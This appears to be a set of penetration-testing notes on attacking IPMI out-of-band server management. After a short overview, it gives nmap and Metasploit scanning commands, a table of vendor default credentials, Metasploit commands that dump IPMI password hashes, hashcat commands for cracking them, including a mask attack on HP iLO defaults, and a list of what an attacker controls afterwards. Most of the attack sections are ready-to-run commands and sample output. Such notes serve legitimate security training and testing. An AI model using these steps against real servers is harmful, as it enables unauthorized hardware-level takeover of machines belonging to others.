**Intelligent Platform Management Interface (IPMI)** is a standardized specification for **out-of-band hardware management**. It allows system administrators to manage, monitor, and recover systems **independently of the host operating system, BIOS, CPU, or firmware**.

IPMI operates as an **autonomous subsystem**, providing remote access even when the system is:

- Powered off
    
- Unresponsive
    
- Crashed or misconfigured
    

Access to IPMI is considered **nearly equivalent to physical access** to the target host.

---

## Common Use Cases

IPMI is typically used:

- Before the OS boots (BIOS/UEFI configuration)
    
- When the host is powered down
    
- After system failure or crash
    
- For remote OS installation or firmware upgrades
    

---

## Network Footprinting and Discovery

### Nmap – IPMI Version Detection

```bash
sudo nmap -sU -p 623 --script ipmi-version <IP>
```

Example output:

```txt
623/udp open  asf-rmcp
| ipmi-version:
|   Version: IPMI-2.0
|   UserAuth: auth_user, non_null_user
|_  Level: 2.0
```

---

### Metasploit – IPMI Version Scan

```bash
msfconsole
use auxiliary/scanner/ipmi/ipmi_version
set RHOSTS <IP>
set RPORT 623
run
```

---

## Default Credentials (High Impact)

|Product|Username|Password|
|---|---|---|
|Dell iDRAC|root|calvin|
|HP iLO|Administrator|Randomized (8 chars: uppercase + digits)|
|Supermicro IPMI|ADMIN|ADMIN|
Default credentials often provide **full hardware control**.

---
## Dumping IPMI Password Hashes

### Metasploit – Dump IPMI Hashes

```bash
msfconsole
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS <IP>
set RPORT 623
run
```

Example output:

```txt
[+] IPMI - Hash found: ADMIN:<hash>
[+] IPMI - Hash matches password: ADMIN
```

---

## Offline Cracking (Hashcat)

### Hashcat – IPMI Hash Mode

```bash
hashcat -m 7300 ipmi_hashes.txt wordlist.txt
```

### HP iLO Default Password (Mask Attack)

```bash
hashcat -m 7300 ipmi_hashes.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

- `?d` → digits
    
- `?u` → uppercase letters
    

---

## Post-Exploitation Impact

If IPMI access is obtained, an attacker can:

- Power on/off the system
    
- Reboot the host
    
- Mount remote ISO images
    
- Reinstall the operating system
    
- Access serial console output
    
- Gain persistent root-level control
    
